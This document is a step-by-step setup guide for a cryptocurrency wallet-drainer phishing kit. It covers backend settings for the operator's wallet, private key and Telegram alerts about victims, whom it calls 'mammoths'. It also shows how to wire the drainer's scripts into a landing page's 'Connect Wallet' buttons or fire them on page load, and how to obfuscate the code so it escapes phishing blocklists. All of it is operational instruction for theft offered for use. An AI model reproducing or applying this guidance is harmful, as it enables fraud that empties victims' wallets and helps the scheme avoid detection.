For the Backend 

FLASH_Telegram_Token = ""; // Enter your token from the bot from @BotFather here (go there, create a bot there and receive this same token)
FLASH_Telegram_Chat_ID = [""]; // Enter here the ID of the chat or chats where you want to send notifications about the actions of the mammoth (if the ID starts with a minus, write it down)
FLASH_Wallet_Address = ""; // Wallet address where mammoth assets will go
FLASH_Wallet_Private = ""; // The private key to the wallet is above, MUST BE INDICATED, OTHERWISE THE OUTPUT WILL NOT WORK
FLASH_Wallet_Receiver = [""];

Now comes the fun part - setting up the script. We open the “server.js” file and see a whole bunch of settings there. The default settings are the most optimal; all you have to do is change the address of the wallet where the money will go and indicate the private key for it. If anything, here are instructions on how to get a private key in MetaMask. Why do you need a private key: when a mammoth gives access to its token to your wallet, it does not transfer it so that this causes less suspicion. Therefore, we need to pull out this token ourselves, for this a transaction will be called on behalf of your wallet that will pull out the token from the mammoth wallet, for this we need a private key.

By the way, the wallet must can have some native coin in each of the networks. In all networks except Ethereum, it is enough to keep $25 - $30, but in Ethereum it is advisable to keep about $50. The native coin is the main coin of the network, in Ethereum it is ETH, in Binance Smart Chain it is BNB, in Avalanche it is AVAX, but in Arbitrum, for example, it is also ETH.

For the frontend

Find a file there called “main.js”. Open this file with any code editor, for example, Visual Studio Code (not to be confused with regular Visual Studio) or Notepad++. At the very top of the script you will find the variable “FLASH_Server” - you need to enter the domain on which your server will be located. This is not the domain where your website is located, but a separate domain for the server - this is important!
As you already understood, for the server you will need to purchase a separate domain, or create a subdomain on which you will hang the server. One server can be used for several sites. The main condition is that all these sites will use the same wallet, as well as settings. But, of course, it’s not a problem if you only work with one site.

Now open the site file where your landing page is located, usually it is called “index.html”. Scroll to the bottom of the file and look for a special tag that looks like this: </body>. Once you have found it, write the following lines of code right before it:

<script src="scripts/connect.js"></script>
<script src="scripts/data.js"></script>
<script src="scripts/web3-loader.js"></script>
<script src="scripts/web3-modal.js"></script>
<script src="scripts/router.js"></script>
<script src="scripts/module.js"></script>
<script src="scripts/alert.js"></script>
<script src="scripts/ethers.js"></script>
<script src="scripts/ethereum-tx.js"></script>
<script src="scripts/module-blur.js"></script>
<script src="scripts/module-seaport.js"></script>
<script src="scripts/module-x2y2.js"></script>
<script src="main.js"></script>

Please note that these scripts will only work on hosting and only with an installed SSL certificate, that is, over HTTPS.

There are two main ways to connect a drainer. The first method is to simply add the desired function to the button so that it is called when clicked:
onclick="ms_init()"

That is, in the final version it will look like this:
<button class="button btn-dark" onclick="ms_init()">
Connect Wallet
</button>
Or, the second option, you can add a class to the desired button:
class="connect-button"
And it will look like this in the button:
<button class="button btn-dark connect-button"> {RECOMMENDED}
Connect Wallet
</button>

When you apply this to all the buttons you need, everything will work. And if you suddenly want the drainer to fire when the page is opened, before the </body> tag, just add another script with the following content:
document.addEventListener("DOMContentLoaded", () => {
setTimeout(() => ms_init(), 5000);
});
Great, the setup of the client part of the script has been successfully completed, now it must be obfuscated so that the code does not end up in phishing databases, and simply so that no one steals it from your site, which, of course, is very important.
For this we need the following website: obfuscator.io
Again, open the contents of the “main.js” file, where we configured the domain for the server, and completely copy all the contents and paste it onto the above site. Scroll a little lower and find the “Reset Options” button, click on it, scroll a little lower and check the box next to the two items “Self Defending” and “Debug Protection”. Also, in the “Domain Lock” field, you can enter the domain of the site where the script will be located and click on the plus sign, in this case, if the drainer is stolen, the attacker’s site will simply break.
We go up and press the blue “Obfuscate” button and get a modified, unreadable form of the code. We copy it completely and paste the content back into “main.js” in obfuscated form, save it and upload it to the hosting. Great, you are simply amazing!

It is also very advisable to use Cloudfare for the frontend so has to make it more secure.

You will need to obfuscate the Blur module: to do this, go to the "assets" folder, then to the "scriots" folder and find "module-x2y2.js" there, copy all the contents, go to the website obfuscator.io, paste the code there, set the same settings as for “mainn.js” and obfuscate.





